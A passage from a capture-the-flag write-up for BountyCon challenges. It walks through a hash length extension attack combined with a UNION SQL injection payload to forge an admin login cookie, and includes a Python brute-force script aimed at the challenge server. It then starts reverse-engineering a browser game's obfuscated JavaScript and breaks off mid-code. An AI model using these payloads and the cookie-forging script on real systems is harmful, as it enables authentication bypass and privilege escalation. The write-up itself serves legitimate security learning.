<span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div></div>

<p>For setting <code class="highlighter-rouge">role</code> to <code class="highlighter-rouge">admin</code>, you can use a UNION-based SQL injection:</p>


<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- original query is:</span>
<span class="k">select</span> <span class="nv">`email`</span><span class="p">,</span> <span class="nv">`role`</span> <span class="k">from</span> <span class="nv">`users`</span> <span class="k">where</span> <span class="nv">`email`</span> <span class="o">=</span> <span class="nv">"$data"</span>
<span class="k">select</span> <span class="nv">`email`</span><span class="p">,</span> <span class="nv">`role`</span> <span class="k">from</span> <span class="nv">`users`</span> <span class="k">where</span> <span class="nv">`email`</span> <span class="o">=</span> <span class="nv">"hi@kishan.info"</span>
<span class="c1">-- so final query with tampered data will be:</span>
<span class="k">select</span> <span class="nv">`email`</span><span class="p">,</span> <span class="nv">`role`</span> <span class="k">from</span> <span class="nv">`users`</span> <span class="k">where</span> <span class="nv">`email`</span> <span class="o">=</span> <span class="nv">"hi@kishan.info&lt;PADDING_DATA_BINARY&gt;"</span> <span class="k">union</span> <span class="k">select</span> <span class="nv">"admin"</span><span class="p">,</span><span class="nv">"admin"</span>
</code></pre></div></div>
<p>Since no record will be found with that email, <code class="highlighter-rouge">admin</code> and <code class="highlighter-rouge">admin</code> will be returned for <code class="highlighter-rouge">email</code> and <code class="highlighter-rouge">role</code>.</p>



<p>Now you have the original data (<code class="highlighter-rouge">hi@kishan.info</code>), the data you want to append (<code class="highlighter-rouge">" union select "admin","admin</code>) and the hash (<code class="highlighter-rouge">f28fd80bda3d36f5b6802f573c4dc4b6</code>) so you can run hash_extender:</p>



<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hash_extender <span class="nt">--data</span> <span class="s1">'hi@kishan.info'</span> <span class="nt">--secret-min</span> 8 <span class="nt">--secret-max</span> 256 <span class="nt">--append</span> <span class="s1">'" union select "admin","admin'</span> <span class="nt">--signature</span> f28fd80bda3d36f5b6802f573c4dc4b6 <span class="nt">--format</span> md5 <span class="nt">--table</span>
</code></pre></div></div>

<p>hash_extender will output the tampered hash and data for each secret length (8 to 256):</p>


<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md5       f4b7808362995522096091577f29e0fd 6869406b697368616e2e696e666f80000000000000000000000000000000000000000000000000000000000000000000b0000000000000002220756e696f6e2073656c656374202261646d696e222c2261646d696e
md5       fc83687ead60a09824aa7c6da9b087a8 6869406b697368616e2e696e666f800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030020000000000002220756e696f6e2073656c656374202261646d696e222c2261646d696e
md5       db5d3d795b8aa1dd9d9f1d194f031a41 6869406b697368616e2e696e666f80000000000000000000000000000000000000000000000000000000000000000000000000000000000070080000000000002220756e696f6e2073656c656374202261646d696e222c2261646d696e
</code></pre></div></div>

<p>Copy all of it to a file or simply redirect the output of the command to a file (<code class="highlighter-rouge">&gt; table</code>).</p>



<p>(Additional tip: if you don't know the hash function used, you can skip the <code class="highlighter-rouge">--format</code> argument and hash_extender will list all possible hash functions for the given hash)</p>



<p>You can send all these values to the server with a script:</p>



<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">urllib</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">urllib3</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">'https://178.128.95.74/ui/?tools-flagship'</span>
<span class="c1"># URL = 'http://localhost:1337/?tools-flagship'
</span>
<span class="k">def</span> <span class="nf">urlencode</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
  <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>

<span class="n">table</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
  <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
    <span class="n">t</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">s+'</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
    <span class="n">table</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">table</span><span class="p">),</span> <span class="s">'max tries'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="n">sig</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">table</span><span class="p">):</span>
  <span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="n">sig</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
  <span class="n">cookie</span> <span class="o">=</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">b64</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
  <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'cookie'</span><span class="p">:</span> <span class="s">'login='</span> <span class="o">+</span> <span class="n">cookie</span>
  <span class="p">}</span>
  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">sig</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
  <span class="k">if</span> <span class="s">'BountyCon'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">break</span>
</code></pre></div></div>

<p>It'll output a valid response with the flag when the secret length is 56:</p>


<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>FLAGship product<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"lead"</span><span class="nt">&gt;</span>Keep it to yourself.<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"display-4"</span><span class="nt">&gt;</span>BountyCon{but-7h3-c00kiezz-R-s3cur3}<span class="nt">&lt;/div&gt;&lt;/div&gt;&lt;footer</span> <span class="na">class=</span><span class="s">"footer mt-5 py-5 bg-light"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p><img src="/--/bountycon20/uibeauty/ui-flag.png" alt="ui.beauty Flag" /></p>



<p>I wasn't completely sure if a hash length extension attack would work and if the SQL injection payload I had was correct so I used the downloaded source code to test it locally first. I had to make a MySQL database and the tables/columns it requires, then I could run it easily using <code class="highlighter-rouge">php -S localhost:1337</code></p>



<h3 id="proof-of-game--web--published-dec-30">Proof-of-Game â Web â published Dec 30</h3>

<blockquote>
  <p>Capturing flags is hard. Take a break!</p>



  <p><a href="https://178.128.95.74/pog/">https://178.128.95.74/pog/</a></p>


</blockquote>

<p>TL;DR: Play the game for first five levels, reverse engineer to solve sixth level, skip seventh level, expand game board to find flag in eighth level</p>



<p>This one is interesting, like the description says capturing flags is hard â take a break and just play the game. You'll be able to solve the first five levels without any technical skill.</p>



<p>Here's a video walkthrough of the first five levels:</p>



<video width="100%" src="/--/bountycon20/pog/walkthrough.mp4" autoplay="" controls=""></video>

<p>On the sixth level, you'll get stuck because there are no controls to jump up and move just one square to the left or right. You'll either be able to jump up or jump up and move two squares:</p>



<p><img src="/--/bountycon20/pog/level6-stuck.png" alt="Proof-of-Game Level 6" /></p>



<p>Let's start reverse engineering the game. Check out the page source:</p>



<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span><span class="nt">&lt;html&gt;&lt;head&gt;</span>
  <span class="nt">&lt;title&gt;</span>pog<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"style.css"</span> <span class="na">media=</span><span class="s">"all"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"pog.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;&lt;body&gt;</span>
  <span class="nt">&lt;main&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"a"</span><span class="nt">&gt;&lt;div</span> <span class="na">id=</span><span class="s">"b"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"overlay"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"controls"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;button</span> <span class="na">id=</span><span class="s">"c_jl"</span><span class="nt">&gt;&lt;/button&gt;&lt;button</span> <span class="na">id=</span><span class="s">"c_u"</span><span class="nt">&gt;&lt;/button&gt;&lt;button</span> <span class="na">id=</span><span class="s">"c_jr"</span><span class="nt">&gt;&lt;/button&gt;</span>
      <span class="nt">&lt;button</span> <span class="na">id=</span><span class="s">"c_l"</span><span class="nt">&gt;&lt;/button&gt;&lt;button</span> <span class="na">id=</span><span class="s">"c_p"</span><span class="nt">&gt;&lt;/button&gt;&lt;button</span> <span class="na">id=</span><span class="s">"c_r"</span><span class="nt">&gt;&lt;/button&gt;</span>
      <span class="nt">&lt;button</span> <span class="na">id=</span><span class="s">"c_re"</span><span class="nt">&gt;&lt;/button&gt;&lt;button</span> <span class="na">id=</span><span class="s">"c_d"</span><span class="nt">&gt;&lt;/button&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"energybar"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"info"</span><span class="nt">&gt;&lt;/div&gt;</span>
  <span class="nt">&lt;/main&gt;</span>
<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
</code></pre></div></div>

<p>All the game logic is in <code class="highlighter-rouge">pog.js</code> so <a href="https://beautifier.io/">beautify it</a> and check it out. I've posted it here with a few edits:</p>



<div style="min-width:1000px" class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. comment the first and last lines</span>
<span class="c1">// window["onload"] = () =&gt; {</span>
<span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
            <span class="nx">e</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="nx">f</span> <span class="o">=</span> <span class="nx">g</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">h</span> <span class="o">=</span> <span class="p">(</span><span class="nx">g</span> <span class="o">^</span> <span class="nx">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="nx">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="nx">d</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">^</span> <span class="nx">d</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">^</span> <span class="nx">d</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>
                <span class="nx">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="nx">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="nx">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">e</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nx">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="nx">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="nx">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">e</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nx">d</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="nx">d</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="nx">d</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">h</span><span class="p">)</span> <span class="nx">d</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="nx">d</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="nx">d</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0x7F</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">h</span><span class="p">)</span> <span class="nx">d</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="nx">d</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="nx">d</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">;</span>
                <span class="nx">e</span><span class="o">++</span><span class="p">;</span>
                <span class="k">return</span> <span class="nx">h</span><span class="p">;</span>
            <span class="p">},</span>
            <span class="nx">i</span> <span class="o">=</span> <span class="mi">14</span><span class="p">,</span>
            <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="nx">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="nx">l</span> <span class="o">=</span> <span class="p">(</span><span class="nx">m</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">o</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
                    <span class="nx">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">return</span> <span class="nx">g</span> <span class="o">=&gt;</span> <span class="p">{</span>
                    <span class="nx">p</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">g</span> <span class="o">&lt;&lt;</span> <span class="nx">o</span><span class="o">++</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">o</span> <span class="o">&gt;=</span> <span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">m</span><span class="p">(</span><span class="nx">p</span><span class="p">);</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                <span class="p">};</span>
            <span class="p">},</span>
            <span class="nx">q</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="s2">" "</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="s2">"e"</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="s2">"t"</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="s2">"o"</span><span class="p">,</span> <span class="s2">"n"</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="s2">"i"</span><span class="p">,</span> <span class="s2">"s"</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="s2">"h"</span><span class="p">,</span> <span class="s2">"d"</span><span class="p">,</span> <span class="s2">"l"</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="s2">"u"</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="s2">"c"</span><span class="p">,</span> <span class="s2">"f"</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="s2">"m"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">,</span> <span class="s2">"y"</span><span class="p">,</span> <span class="s2">"g"</span><span class="p">,</span> <span class="s2">"b"</span><span class="p">,</span> <span class="s2">"p"</span><span class="p">,</span> <span class="s2">"q"</span><span class="p">,</span> <span class="s2">"v"</span><span class="p">,</span> <span class="s2">"k"</span><span class="p">,</span> <span class="s2">"j"</span><span class="p">,</span> <span class="s2">"x"</span><span class="p">,</span> <span class="s2">"z"</span><span class="p">],</span>
            <span class="nx">r</span> <span class="o">=</span> <span class="p">(</span><span class="nx">m</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">s</span> <span class="o">=</span> <span class="s2">""</span><span class="p">,</span>
                    <span class="nx">t</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">return</span> <span class="nx">g</span> <span class="o">=&gt;</span> <span class="p">{</span>
                    <span class="nx">t</span> <span class="o">=</span> <span class="nx">q</span><span class="p">[</span><span class="nx">t</span><span class="p">]</span> <span class="o">+</span> <span class="nx">g</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">q</span><span class="p">[</span><span class="nx">t</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"string"</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">s</span> <span class="o">+=</span> <span class="nx">q</span><span class="p">[</span><span class="nx">t</span><span class="p">];</span>
                        <span class="nx">t</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"  "</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">m</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">s</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">2</span><span class="p">));</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                <span class="p">};</span>
            <span class="p">},</span>
            <span class="nx">u</span> <span class="o">=</span> <span class="nx">b</span><span class="p">,</span>
            <span class="nx">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="nx">w</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">f</span><span class="p">((</span><span class="nx">u</span><span class="p">[</span><span class="nx">v</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">7</span> <span class="o">-</span> <span class="p">(</span><span class="nx">v</span><span class="o">++</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">),</span>
            <span class="nx">x</span> <span class="o">=</span> <span class="p">[</span><span class="nx">l</span><span class="p">(</span><span class="nx">y</span> <span class="o">=&gt;</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">y</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span> <span class="nx">l</span><span class="p">(</span><span class="nx">y</span> <span class="o">=&gt;</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">j</span> <span class="o">*</span> <span class="p">(</span><span class="nx">k</span> <span class="o">=</span> <span class="nx">y</span><span class="p">),</span> <span class="mi">7</span><span class="p">)],</span>
            <span class="nx">z</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">A</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">while</span> <span class="p">(</span><span class="nx">A</span> <span class="o">&lt;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">A</span><span class="p">](</span><span class="nx">w</span><span class="p">()))</span> <span class="p">{</span>
                        <span class="nx">x</span><span class="p">.</span><span class="nx">splice</span><span class="p">(</span><span class="nx">A</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nx">A</span><span class="o">++</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">},</span>
            <span class="nx">B</span> <span class="o">=</span> <span class="p">[],</span>
            <span class="nx">C</span><span class="p">,</span> <span class="nx">D</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">],</span>
            <span class="nx">E</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="nx">F</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="nx">G</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">w</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">w</span><span class="p">())</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">w</span><span class="p">())</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nx">w</span><span class="p">())</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="nx">E</span> <span class="o">||</span> <span class="nx">w</span><span class="p">())</span> <span class="p">{</span>
                                <span class="k">if</span> <span class="p">(</span><span class="nx">F</span> <span class="o">||</span> <span class="nx">w</span><span class="p">())</span> <span class="p">{</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="nx">w</span><span class="p">())</span> <span class="p">{</span>
                                        <span class="kd">let</span> <span class="nx">H</span> <span class="o">=</span> <span class="nx">B</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
                                        <span class="nx">D</span> <span class="o">=</span> <span class="p">[</span><span class="mi">5</span><span class="p">];</span>
                                        <span class="nx">x</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">r</span><span class="p">(</span><span class="nx">y</span> <span class="o">=&gt;</span> <span class="p">{</span>
                                            <span class="k">if</span> <span class="p">(</span><span class="nx">y</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="s2">"xnrg"</span><span class="p">)</span> <span class="p">{</span>
                                                <span class="nx">B</span><span class="p">[</span><span class="s2">"e"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">y</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nx">split</span><span class="p">(</span><span class="s2">""</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">I</span> <span class="o">=&gt;</span> <span class="s2">"abcdefghij"</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">I</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s2">""</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
                                                <span class="nx">y</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
                                            <span class="p">}</span>
                                            <span class="k">if</span> <span class="p">(</span><span class="nx">y</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="s2">"xnam"</span><span class="p">)</span> <span class="p">{</span>
                                                <span class="nx">B</span><span class="p">[</span><span class="s2">"n"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">y</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
                                                <span class="nx">y</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
                                            <span class="p">}</span>
                                            <span class="nx">B</span><span class="p">[</span><span class="nx">H</span><span class="p">].</span><span class="nx">push</span><span class="p">(</span><span class="nx">y</span><span class="p">)</span>
                                        <span class="p">}));</span>
                                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                                        <span class="k">if</span> <span class="p">(</span><span class="nx">w</span><span class="p">())</span> <span class="p">{</span>
                                            <span class="kd">let</span> <span class="nx">J</span> <span class="o">=</span> <span class="nx">B</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
                                            <span class="nx">D</span> <span class="o">=</span> <span class="p">[</span><span class="mi">7</span><span class="p">];</span>
                                            <span class="nx">x</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">l</span><span class="p">(</span><span class="nx">y</span> <span class="o">=&gt;</span> <span class="nx">B</span><span class="p">[</span><span class="nx">J</span><span class="p">].</span><span class="nx">push</span><span class="p">(</span><span class="nx">y</span><span class="p">),</span> <span class="mi">2</span><span class="p">));</span>
                                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                                            <span class="kd">let</span> <span class="nx">K</span> <span class="o">=</span> <span class="nx">B</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
                                            <span class="nx">D</span> <span class="o">=</span> <span class="p">[</span><span class="mi">6</span><span class="p">];</span>
